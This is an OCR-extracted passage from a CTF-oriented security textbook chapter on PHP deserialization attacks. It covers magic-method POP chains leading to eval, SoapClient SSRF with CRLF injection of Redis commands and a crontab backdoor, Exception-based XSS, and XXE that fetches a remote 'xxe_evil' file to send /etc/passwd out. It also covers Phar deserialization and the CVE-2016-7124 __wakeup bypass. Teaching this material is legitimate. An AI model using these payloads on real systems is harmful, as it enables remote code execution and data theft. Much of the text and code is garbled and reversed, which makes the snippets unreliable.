has some malicious code, it can complete the attack.
sem Sumoo aqp u pus83n ane spoqu ox3eu uouuo
• When the object is created: _construct.
When the object is destroyed: _destruct.
•When the object is used as a string: _toString.
Called before serializing the object (its returm needs to be an array): _sleep.
▪ Call before resuming the object by deserialization: _wakeup.
---
## Page 212
3.1 Deserialization Vulnerabilities
197
▪ Called automatically when calling a method that does not exist in the object:
_call.
▪Read data from an inaccessible atribute: geL.
The following is an introduction to some common exploitation of deserialization
mining.
3.1.1.1  Common Deserialization
The PHP code is as follows:
dud >
class test[
function __destzuct () (
echo *destruct... ";
eval ($_GEr [′ cnd′]) ;
unserialize (S_GET['u°]1 ;
? >
This code exists in the test class, where the _destruct magic function also
contains code for eval(S_GET[°cmd’]), which then receives the serialized string
with the argument u. So, you can use _destruct to automatically call this method
when the object is destroyed, and then pass in the PHP code with the CMD argument
to achieve arbitrary code execution.
In the utilization program, first define the test class, and then instantiate it, and
then serialize the output string, will use the code saved as a PHP file, browser access
can display the serialized string, that is, O:4:°test":0:(). The code is as follows:
?php
Stest = nev teat;
class test{)
echo serialize (Stest) ;
≤ 
The u-parameter is passed to O:4:"test":0:{) and the cmd-parameter is passed to
system(*"whoami"), i.e. the last code will execute system() to call the whoami
command.
The results of the exploit are shown in Fig. 3.1.
Sometimes we run into a magic method that has no code to make use of, i.e. there
is no eval(S_GET[°CMD°]), but there is code to call another class method, and we
can look for other classes that have methods with the same name. For example,
Fig. 3.2 shows the code with the bug.
The above code exists a normal class and a malicious class called evil. It can be
found that the normal call of the lemon class creates a normal instance and calls the
---
## Page 213
198
3 Advanced Web Challenges
→C
①不安全|null.com/ur
erialize/1.php?u=O:4:*test*:0:08&cmd=system(*wh
destruct..
test\test1
Fig, 3.1 Result
1
Class0bj = new normal();
6
function
destruct（）{
8
9
10
11
class normal{
12
function action()(
13
echo
"hello";
14
15
16
class evil(
17
private Sdata;
18
function aotion()(
19
eval ($this->data) ;
20
21
22
anserialize（$_GET['d']);
23
Fig, 3.2 PHP code
action method of the normal instance in the destruct. If Sthis->ClassObj is replaced
with the evil class, the action method of evil will be called when the action method is
called, thus entering the eval(Sthis->data) statement, resulting in arbitrary code
execution.
In the Exploit construct, we can change the Classobj to the evil class in _con-
struct and assign the evil class’s private property data to phplnf O. Exploit
constructed is shown in Fig. 3.3.
If you save it as a PHP file and access it, you’ll get a string of characters:
O:5 :"1emon" : 1 : {:11:**Class0bj*;0:4:*evi1*:1 : {≤:10 :*evi1data*;
s : 10 : "php1nfo () ;*;// }
---
## Page 214
3.1 Deserialization Vulnerabilities
661
日ClassObj =new evil();
class evil(
9
private $data ="phpinfo();";
10
echo urlencode(serialize(new lemon())):
11
12
echo
"\n\r";
Fig, 3.3 PHP code
php
Fig, 3.4 Result
Note that since ClassObj is protected, it is represented by *%00*%00" and “%00"
is an invisible character, try to use the string afer urlencode to avoid missing “%00
when constructing exploits.
Ultimately, with the generated exploit, the phpinfo code can be executed and the
results are shown in Fig. 3.4.
3.1.1.2 Native Class Utilization
The actual digging_ process often encounters no proper utilization chain, which
requires the use of PHP’s own native classes.
1._call method
The _call magic method is triggered by calling a non-existent class method. The
method has two arguments, the first one is assigned automatically with the name of
the non-existent method and the second one receives the arguments from the
non-existent method. For example, the PHP code is as follows:
---
## Page 215
200
3Advanced Web Challenges
Fig, 3.5 Result
dud >
echo $rce->notexist () ;
Srce = unserialize ($_Rggugsr[*u*]) ;
? >
Deserializing the class to an object via unserialize and calling the notexist method
of the class will trigger the _call magic method.
The existence of the built-in class SoapClient:__Call in PHP, makes it when a a
magic method to perform _call is existing, an SSRF attack can be performed, see
Exploit for the exploit code.
Exploit Generation (for PHP 5/7).
dud >
serialize (nev SoapClient (nul1, array (′uzi' => 'http: //vps/',
: (( (,eee/sdn/ / : dau, 
Set the URI to your VPS server address, and then set the location to http://vps/aaa.
The above generated string is deserialized with the unserializeQ function, followed
by a call to a method that does not exist, resulting in an SSRF attack, as shown in
Fig. 3.5.
Figure 3.5 shows one Soap request, but only one HTTP request. Of course, CRLF
re ysda/:du,
 -!,---uxas Aa ue Fa = sods
 /Ssss=uoo  Tu*/ / : d。 = o6.xs
Saaa = serialize (Sb) ;
echo urlencode ($aaa) ;
≤ 
---
## Page 216
3.1 Deserialization Vulnerabilities
tion: Keey
e: text/nt;chorset-tf-8
Lo evil string....
://sch
Fig, 3.6 Result
:tex
Fig, 3.7 Result
As shown in Fig. 3.6, the CRLF character has placed the “i am evil string" string
on a new line.
This translates into the following two types of attacks.
(1) Constructing post packets to attack intranet HTTP services.
The problem here is that Soap has Content-Type: text/xml in the default header, but
you can inject data through User-Agent to push down the Content-Type, and
eventually the data after data=abc are ignored by the container.
The results of constructing a POST package are shown in Fig. 3.7.
(2) Constructing arbitrary HTTP headers to attack other intranet services (Redis)
For example, the inject Redis command.
CONFIG s&r dix /root/
---
## Page 217
202
3 Advanced Web Challenges
POST/ MTTP/1.1
.F..158:5511
：PHP-SOAP/S
Live
"tello
text/enl;chorset-utf-8
Length
1.0
CONFIG SET dir /root/
Fig, 3.8 Result
This command is executed if redis has no authorization policy. Of course, it is
also possible to planta backdoor by writing a crontab file. the results of a redis attack
are shown in Fig. 3.8.
Because Redis is lenient in receiving commands, i.e., parsing the HTTP request
header line by line, the “config set dir /root" in Fig. 3.8 will be executed as a Redis
command.
2.__toString
The toString is automatically triggered when the object is treated as a string,
Exploit Generation (for PHP 5/7).
*))) ;
echo urlencode (serialize (new Exception (*alert (/hel1o
≤
The Exception class was used because it doesn’t filter the error message, resulting
in XSS in the webpage after the final deserialization. When constructing the Exploit
generation, XSS code could be taken as the parameter of the Exception class.
The Exception is deserialized by echo, an error is reported, and the XSS code is
output to the web page. The final trigger result is shown in Fig. 3.9.
3.__construct
Normally, there is no way to trigger the _construct magic method in deserialization,
but it is possible to instantiate any class after the developer has tweaked it. For
example, you can initialize any class by adding a call_user_func_array call to your
code and disallowing calls to methods in other classes, to call the construct method
(case may refer to https://5haked.blogspot.jp/2016/10/how-i-hacked-pomhub-for-
---
## Page 218
3.1 Deserialization Vulnerabilities
203
OO 127.0.0.1
 127.61
helle werld
Fig, 3.9 Result
Fig, 3.10 The content of xxe_evil
fun-and-profit.html?m=1), The use of SimpleXMLElement can be found in PHP's
native classes. You can find a description of the SimpleXMLElement class on the
website:
SimpleXMLElement : :
[ooq *] 0 = suotadog aug *]eeps 6utxas) sonxqsuoo
Sdata_is_url = false [, string Sns = "" [, bool $is_prefix = false l1111
The following calls are usually made:
new SimpleXML&1ement ( 'https : / /vps/xoxe_evi1', LIBXML_NOENT, true) ;
Note that parsing of extermal entities is not allowed by default after Libxml 2.9,
but can be enabled with the parameter LIBXML_ NOENT set. See Fig. 3.10 for
xxe_evil.
---
## Page 219
204
3 Advanced Web Challenges
Fig, 3.11 Result
php_unseriaiie_dsts,s var_hash)
if (zig
(taS128_1RT(+ar_hesh):
 o n
e2s
CERS;
Fig, 3.12 The reason of phar can be deserialized
The attack is divided into two XML files. xxe_evil loads the remote
xxe_read_passwd file, xxe_read_passwd loads the /etc/passwd file through the
PHP pseudo-protocol, and then Base64 encodes the file content. Finally, the content
of target file is brought out by stitching it into the HTTP request.
Which means that the /etc/passwd information can also be obtained through
deserialization vulnerability, as shown in Fig. 3.11.
3.1.1.3 Phar Deserialization
In 2017, The first Phar deserialization challenge appeared in Hitcon. In 2018,
Blackhat proposed Phar deserialization, which was further explored. in 2019,
fancy Phar related challenges are released. Phar can be deserialized because
php_var_unserialize is called when phar_parse_metadata is used to parse metadata,
as shown in Fig. 3.12.
The code to generate a Phar package is shown in Fig. 3.13. Note that the phar.
readonly option in php.ini needs to be set to Off
---
## Page 220
3.1 Deserialization Vulnerabilities
205
elass demo(
public $t ="Test";
function
_destruct)(
$obj = nev demo;
f,nox.=startBuffering ():
f（Cqos）eaupeaaasaddFromString('test.txt','test');
$p->stopButfering();
Fig, 3.13 PHP code
3E 60 64 57 09 00 69 01 69 00 62 11 09 00 09 61
4D50494C455228293B203F
F；LT_COMPILER（）;
6D6F
3A313A78733A31
.........0:4."de
22
3A2274223B73
o":1:(s:1:"t";s
73 74 2E 74 78 74 04 00 09 00 62 20 CA 5B 04 00 ;st
3:
7374046E8924DA546F83B5C5065C080A;st.n?款o分\
..te
15 F6D09DFE420200000047424D42
.B....GBME
Fig, 3.14 The content of phar
After editing the Phar package with the WinHEX editor, it can be seen that the
deserialized string content exists in the file, as shown in Fig. 3.14.
So, how do you trigger Phar deserialization? Phar is a pseudo protocol in PHP,
and the most commonly used pseudo protocol is some file manipulation functions,
such as fopenO, copyO, file_existsO, filesizeO, etc. Of course, digging deeper to
p aoo s,dHd u ouy xasademuadouansdqd  nog Suoo
which is the wrapped for more function in PHP to allow more functions to support
the wrapper protocol, such as getimagesize, get_meta_tags, imagecreatefromgif, etc.
The deserialization can be triggered by passing phar://var/www/html/1.phar.
For example, the phar deserialization is triggered by file_exists(°phar:/. /demo.
phar'), the result is shown in Fig. 3.15.
---
## Page 221
206
3 Advanced Web Challenges
←
C
D127.0.0.1
YouWin.
Fig, 3.15 Result
progee
i (ipro
reters 0}
Lata(4a_0scs_F(rval)>fusetion_tubGe, *_wsoep”, sieeot(°_melesp°11) {
*_skep*, siaeotc*_skep°) - 1, 903
_espdo(tunctaon_tabie).rvsl,stnsne,4metvsl_ptr,9,o,1,
1
Fig, 3.16 The specific code
Some of the techniques used in deserialization are more frequently used, but it is
currently difficult to come up with a mere test, more in the form of a combination that
joins the construct utilization chain.
1._ _wakeup Failure: CVE-2016-7124
This issue is mainly due to the design flaws of _wakeup, which bypasses possible
limitations and triggers possible vulnerabilities affecting versions of PHP 5 to 5.6.25
and PHP 7 to 7.0.10.
Reason: When the number of attributes is incorrect, process_nested_data will
return O, which will cause the call_user_function_ex function not to be executed, so
_wakeup( ) will not be called in PHP.
See Fig. 3.16 for the specific code.
You can use the code in Fig. 3.17 for local testing by entering.
O : 4 : "demo" : 1 : {=:5 : *denoa* ;a: 0 : ())
As you can see, Fig. 3.18 triggers the code in wakeup.
When the number of attributes after changing the demo is 2 (see Fig. 3.19)
O : 4 : "demo" : 2 : {≤:5 : *denoa*;a:0 : ())
---
## Page 222
3.1 Deserialization Vulnerabilities
207
Fig, 3.17 PHP code
class demo(
private $a = array():
function
"1 am destruct.
destruct()(
echo
function
wakeup() (
9
echo
"am